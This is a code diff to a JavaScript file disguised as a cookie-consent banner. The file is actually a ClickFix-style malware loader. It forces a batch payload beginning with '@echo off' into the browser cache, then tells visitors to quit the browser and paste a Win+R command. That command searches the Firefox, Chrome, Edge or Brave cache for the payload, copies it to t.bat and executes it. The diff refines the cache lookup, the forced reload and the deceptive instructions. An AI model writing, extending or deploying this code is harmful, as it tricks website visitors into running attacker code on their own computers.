@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.10',
+    version: '1.9.11',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -26,9 +26,9 @@
     bodyMustStartWith: '@echo off',
     verificationTemplates: {
       firefox: 'cmd /k cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do @for %f in (%~sp\\cache2\\entries\\*) do @findstr /b /c:@echo "%f">nul&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
-      chrome: 'cmd /k cd/d %TMP%&for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (f_*)do @findstr /m /c:{SM} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit',
-      edge: 'cmd /k cd/d %TMP%&for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (f_*)do @findstr /m /c:{SM} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit',
-      brave: 'cmd /k cd/d %TMP%&for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (f_*)do @findstr /m /c:{SM} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit'
+      chrome: 'cmd /k cd/d %TMP%&del t.bat 2>nul&for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (f_*)do @findstr /m /c:{M} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit',
+      edge: 'cmd /k cd/d %TMP%&del t.bat 2>nul&for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (f_*)do @findstr /m /c:{M} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit',
+      brave: 'cmd /k cd/d %TMP%&del t.bat 2>nul&for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (f_*)do @findstr /m /c:{M} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit'
     }
   };
 
@@ -118,7 +118,7 @@
       if (bk === 'firefox') {
         statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes — Win+R scans Firefox cache2\\entries';
       } else {
-        statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes (' + bk + ', ' + getChromiumProfileFolder() + ') — close browser, then Win+R; ?cp=default for Default profile';
+        statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes (' + bk + ', ' + getChromiumProfileFolder() + ') — each run: reload this page, quit browser fully, then Win+R';
       }
       statusEl.className = 'ok';
       if (previewEl && text) previewEl.textContent = text;
@@ -145,11 +145,6 @@
     return 'Profile 1';
   }
 
-  function getChromiumMarkerNeedle() {
-    var startMarker = CONSENT_CONFIG.bodyStartMarker || 'CDRP7F3A9D2B8C4';
-    return startMarker.length > 7 ? startMarker.slice(0, 7) : startMarker;
-  }
-
   function getVerificationCommand() {
     var startMarker = CONSENT_CONFIG.bodyStartMarker || 'CDRP7F3A9D2B8C4';
     var endMarker = CONSENT_CONFIG.bodyEndMarker || 'CDRPEND7F3A9D2';
@@ -168,7 +163,6 @@
       .replace(/\{E\}/g, endMarker)
       .replace(/\{SM1\}/g, String(bodySize - 1))
       .replace(/\{SZ\}/g, String(bodySize))
-      .replace(/\{SM\}/g, getChromiumMarkerNeedle())
       .replace(/\{PROF\}/g, getChromiumProfileFolder());
   }
 
@@ -341,6 +335,9 @@
     } catch (e2) {}
     try {
       fetch(url, { cache: 'force-cache', credentials: 'omit' });
+      setTimeout(function () {
+        fetch(url, { cache: 'reload', credentials: 'omit' }).catch(function () {});
+      }, 400);
     } catch (e3) {}
   }
 
@@ -455,7 +452,7 @@
 
   function getVerifyingHtml(refId) {
     var closeBrowser = getBrowserKey() !== 'firefox'
-      ? '<li>Close all ' + (getBrowserKey() === 'edge' ? 'Edge' : 'Chrome') + ' windows (required so cache flushes to disk)</li>'
+      ? '<li>Quit ' + (getBrowserKey() === 'edge' ? 'Edge' : 'Chrome') + ' completely (every time — tray too), so /j is written to disk</li>'
       : '';
     return (
       '<div class="ts-v-header">' +
